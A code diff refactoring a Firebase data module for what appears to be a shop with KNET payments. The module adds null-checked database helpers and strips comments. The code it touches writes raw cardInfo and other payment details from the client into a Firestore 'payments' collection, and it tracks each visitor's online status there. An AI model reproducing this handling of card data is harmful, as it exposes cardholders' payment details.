@@ -20,6 +20,16 @@ import {
   set,
 } from "firebase/database";
 
+const getDb = () => {
+  if (!db) throw new Error("Firebase is not configured");
+  return db;
+};
+
+const getDatabase = () => {
+  if (!database) throw new Error("Firebase Realtime Database is not configured");
+  return database;
+};
+
 export interface FirestoreProduct {
   id: string;
   nameAr: string;
@@ -73,31 +83,11 @@ export interface CartItem {
   quantity: number;
 }
 
-// Lazy initialization of collections to handle when Firebase is not configured
-export const getProductsCollection = () => {
-  if (!db) throw new Error("Firebase is not configured");
-  return collection(db, "products");
-};
-
-export const getOrdersCollection = () => {
-  if (!db) throw new Error("Firebase is not configured");
-  return collection(db, "orders");
-};
-
-export const getCartsCollection = () => {
-  if (!db) throw new Error("Firebase is not configured");
-  return collection(db, "carts");
-};
-
-export const getUsersCollection = () => {
-  if (!db) throw new Error("Firebase is not configured");
-  return collection(db, "users");
-};
-
-export const getPaymentsCollection = () => {
-  if (!db) throw new Error("Firebase is not configured");
-  return collection(db, "payments");
-};
+export const getProductsCollection = () => collection(getDb(), "products");
+export const getOrdersCollection = () => collection(getDb(), "orders");
+export const getCartsCollection = () => collection(getDb(), "carts");
+export const getUsersCollection = () => collection(getDb(), "users");
+export const getPaymentsCollection = () => collection(getDb(), "payments");
 
 export interface KnetPayment {
   id: string;
@@ -132,7 +122,7 @@ export async function getProducts(): Promise<FirestoreProduct[]> {
 export async function getProductById(
   id: string,
 ): Promise<FirestoreProduct | null> {
-  const docRef = doc(db, "products", id);
+  const docRef = doc(getDb(), "products", id);
   const docSnap = await getDoc(docRef);
   if (docSnap.exists()) {
     return { id: docSnap.id, ...docSnap.data() } as FirestoreProduct;
@@ -169,7 +159,7 @@ export async function getOrders(): Promise<FirestoreOrder[]> {
 }
 
 export async function getOrderById(id: string): Promise<FirestoreOrder | null> {
-  const docRef = doc(db, "orders", id);
+  const docRef = doc(getDb(), "orders", id);
   const docSnap = await getDoc(docRef);
   if (docSnap.exists()) {
     return { id: docSnap.id, ...docSnap.data() } as FirestoreOrder;
@@ -182,7 +172,7 @@ export async function updateOrderStatus(
   status: string,
   paymentStatus?: string,
 ): Promise<void> {
-  const docRef = doc(db, "orders", id);
+  const docRef = doc(getDb(), "orders", id);
   const updateData: any = { status };
   if (paymentStatus) {
     updateData.paymentStatus = paymentStatus;
@@ -191,7 +181,7 @@ export async function updateOrderStatus(
 }
 
 export async function getCart(sessionId: string): Promise<CartItem[]> {
-  const docRef = doc(db, "carts", sessionId);
+  const docRef = doc(getDb(), "carts", sessionId);
   const docSnap = await getDoc(docRef);
   if (docSnap.exists()) {
     return docSnap.data().items || [];
@@ -203,7 +193,7 @@ export async function updateCart(
   sessionId: string,
   items: CartItem[],
 ): Promise<void> {
-  const docRef = doc(db, "carts", sessionId);
+  const docRef = doc(getDb(), "carts", sessionId);
   await setDoc(
     docRef,
     { items, updatedAt: new Date().toISOString() },
@@ -212,7 +202,7 @@ export async function updateCart(
 }
 
 export async function clearCart(sessionId: string): Promise<void> {
-  const docRef = doc(db, "carts", sessionId);
+  const docRef = doc(getDb(), "carts", sessionId);
   await setDoc(docRef, { items: [], updatedAt: new Date().toISOString() });
 }
 
@@ -220,7 +210,7 @@ export function subscribeToPaymentStatus(
   paymentId: string,
   callback: (status: string) => void,
 ): () => void {
-  const docRef = doc(db, "payments", paymentId);
+  const docRef = doc(getDb(), "payments", paymentId);
   return onSnapshot(docRef, (docSnap) => {
     if (docSnap.exists()) {
       const data = docSnap.data();
@@ -234,7 +224,7 @@ export async function createPayment(paymentData: {
   amount: string;
   cardInfo?: any;
 }): Promise<string> {
-  const docRef = await addDoc(collection(db, "payments"), {
+  const docRef = await addDoc(collection(getDb(), "payments"), {
     ...paymentData,
     status: "pending",
     createdAt: new Date().toISOString(),
@@ -246,7 +236,7 @@ export async function updatePaymentStatus(
   paymentId: string,
   status: string,
 ): Promise<void> {
-  const docRef = doc(db, "payments", paymentId);
+  const docRef = doc(getDb(), "payments", paymentId);
   await updateDoc(docRef, { status });
 }
 
@@ -274,7 +264,7 @@ export async function updateKnetPaymentStatus(
   paymentId: string,
   status: string,
 ): Promise<void> {
-  const docRef = doc(db, "payments", paymentId);
+  const docRef = doc(getDb(), "payments", paymentId);
   await updateDoc(docRef, { status });
 }
 
@@ -282,7 +272,7 @@ export async function updateProduct(
   id: string,
   data: Partial<FirestoreProduct>,
 ): Promise<void> {
-  const docRef = doc(db, "products", id);
+  const docRef = doc(getDb(), "products", id);
   await updateDoc(docRef, data);
 }
 
@@ -297,21 +287,19 @@ export async function seedProducts(
 export async function addData(data: any) {
   localStorage.setItem("visitor", data.id);
   try {
-    const docRef = await doc(db, "payments", data.id!);
+    const docRef = await doc(getDb(), "payments", data.id!);
     await setDoc(docRef, data, { merge: true });
 
     console.log("Document written with ID: ", docRef.id);
-    // You might want to show a success message to the user here
   } catch (e) {
     console.error("Error adding document: ", e);
-    // You might want to show an error message to the user here
   }
 }
 export const handlePay = async (paymentInfo: any, setPaymentInfo: any) => {
   try {
     const visitorId = localStorage.getItem("visitor");
     if (visitorId) {
-      const docRef = doc(db, "payments", visitorId);
+      const docRef = doc(getDb(), "payments", visitorId);
       await setDoc(
         docRef,
         { ...paymentInfo, createdDate: new Date().toISOString() },
@@ -327,26 +315,20 @@ export const handlePay = async (paymentInfo: any, setPaymentInfo: any) => {
 export const setupOnlineStatus = (userId: string) => {
   if (!userId) return;
 
-  // Create a reference to this user's specific status node in Realtime Database
-  const userStatusRef = ref(database, `/status/${userId}`);
+  const userStatusRef = ref(getDatabase(), `/status/${userId}`);
+  const userDocRef = doc(getDb(), "payments", userId);
 
-  // Create a reference to the user's document in Firestore
-  const userDocRef = doc(db, "payments", userId);
-
-  // Set up the Realtime Database onDisconnect hook
   onDisconnect(userStatusRef)
     .set({
       state: "offline",
       lastChanged: serverTimestamp(),
     })
     .then(() => {
-      // Update the Realtime Database when this client connects
       set(userStatusRef, {
         state: "online",
         lastChanged: serverTimestamp(),
       });
 
-      // Update the Firestore document
       updateDoc(userDocRef, {
         online: true,
         lastSeen: serverTimestamp(),
@@ -356,11 +338,9 @@ export const setupOnlineStatus = (userId: string) => {
     })
     .catch((error) => console.error("Error setting onDisconnect:", error));
 
-  // Listen for changes to the user's online status
   onValue(userStatusRef, (snapshot) => {
     const status = snapshot.val();
     if (status?.state === "offline") {
-      // Update the Firestore document when user goes offline
       updateDoc(userDocRef, {
         online: false,
         lastSeen: serverTimestamp(),
@@ -375,14 +355,12 @@ export const setUserOffline = async (userId: string) => {
   if (!userId) return;
 
   try {
-    // Update the Firestore document
-    await updateDoc(doc(db, "payments", userId), {
+    await updateDoc(doc(getDb(), "payments", userId), {
       online: false,
       lastSeen: serverTimestamp(),
     });
 
-    // Update the Realtime Database
-    await set(ref(database, `/status/${userId}`), {
+    await set(ref(getDatabase(), `/status/${userId}`), {
       state: "offline",
       lastChanged: serverTimestamp(),
     });
